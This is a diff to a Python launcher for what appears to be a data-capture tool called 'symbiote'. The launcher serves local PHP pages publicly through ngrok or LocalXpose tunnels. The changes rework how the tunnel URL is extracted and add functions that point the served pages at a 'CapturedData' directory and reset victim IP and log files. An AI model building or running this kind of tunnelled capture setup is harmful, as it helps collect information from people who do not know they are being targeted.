@@ -11,13 +11,12 @@ import json
 import subprocess
 import ctypes
 from time import sleep
-from os import system, environ, path, getuid
+from os import system, environ, path, getuid, popen
 from distutils.dir_util import copy_tree
 from subprocess import check_output, CalledProcessError
 from sys import stdout, argv, exit
 from Server import *
 from Checks import *
-from makepath import *
 from logo import *
 from pross_kill import *
 #hiiii
@@ -94,7 +93,7 @@ def runNgrok(port):
     system('./Server/ngrok http {0} > /dev/null &'.format(port))
     sleep(10)
     while True:
-        system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link.url')
+        system('curl -s -N http://127.0.0.1:4040/api/tunnels | jq | grep public_url | grep -Eo "(http)://[a-zA-Z0-9./?=_%:-]*" > link.url')
         urlFile = open('link.url','r')
         url = urlFile.read()
         urlFile.close()
@@ -109,7 +108,7 @@ def customLocalxpose(port):
     lnk = input("\n{0}CUSTOM Subdomain---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
     system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
-    system('./Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &' % (port, lnk))
+    system('./Server/loclx tunnel --raw-mode http --to :%s --subdomain %s > link.url 2>&1 &' % (port, lnk))
     sleep(10)
     try:
         output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
@@ -133,9 +132,9 @@ def randomLocalxpose(port):
     sbanner()
     print("\n\n{5}-------------------------------\n{0} [ {2}RANDOM LOCALXPOSE URL !!{0}] \n{5}-------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
-    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 ".format(name,port))
-    system('./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
+    # system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
+    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
+    system('./Server/loclx tunnel --raw-mode http --to :%s > link.url 2>&1 &' % (port))
     sleep(10)
     f=open("link.url", "r")
     url=(f"{f.read().split(',')[1]}")
@@ -202,8 +201,31 @@ def selectServer(port):
         system('clear')
         return selectServer(port)
 
-#def printoutput(name,url,port):
-    #if name == 'ngrok':
+def getpath():
+    path = popen('pwd').readline()
+    x = path.split("\n")
+    f = open("Server/www_f/path.txt", "w")
+    f.write("{0}/CapturedData/".format(x[0]))
+    f.close()
+    sleep(2)
+    path = popen('pwd').readline()
+    x = path.split("\n")
+    f = open("Server/www_b/path.txt", "w")
+    f.write("{0}/CapturedData/".format(x[0]))
+    f.close()
+    sleep(2)
+
+def fresh():
+    system("fuser -k Server/ngrok > /dev/null 2>&1")
+    system('rm -rf Server/www_f/ip.txt && touch Server/www_f/ip.txt')
+    system('rm -rf Server/www_b/ip.txt && touch Server/www_b/ip.txt')
+    system('rm -rf Server/www_f/Log.log && touch Server/www_f/Log.log')
+    system('rm -rf Server/www_b/Log.log && touch Server/www_b/Log.log') 
+    system('rm -rf Server/www_f/path.txt && touch Server/www_f/path.txt')
+    system('rm -rf Server/www_b/path.txt && touch Server/www_b/path.txt')
+    system('fuser -k link.url > /dev/null 2>&1 && rm -rf link.url && touch link.url')
+
+
 def ngrokoutput(name,url,port):
     system('clear')
     print("\n\n{5}---------------------------\n{0}[{2} NGROK URL !! {0}]{5} \n---------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
@@ -256,17 +278,16 @@ def report(url,port):
                 android_end()
             elif kill == '2':
                  end()
-            sleep(2)
             exit()
         else:
             system('clear')
-            sleep(0.5)
+            sleep(0.2)
             report(url,port)
 system('clear')
 # verCheck()
 system('termux-open https://github.com/404-ghost/symbiote &>/dev/null')
-sleep(1)
 system("git pull --quiet") 
+sleep(1)
 menu_q()
 global kill
 system('clear')
